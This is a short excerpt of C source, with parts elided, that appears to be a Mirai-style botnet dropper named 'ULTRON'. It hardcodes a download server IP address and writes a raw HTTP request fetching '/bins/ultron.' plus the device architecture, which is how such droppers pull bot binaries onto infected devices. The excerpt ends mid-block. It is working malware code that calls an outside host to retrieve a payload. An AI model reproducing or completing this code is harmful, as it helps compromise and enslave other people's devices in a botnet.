...
#define HTTP_SERVER utils_inet_addr(168,235,82,217) // 168.235.82.217 

#define EXEC_MSG            "ULTRON\n"
#define EXEC_MSG_LEN        7
...
inline void run(void)
{
    ...
    if (write(sfd, "GET /bins/ultron." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
    {
#ifdef DEBUG
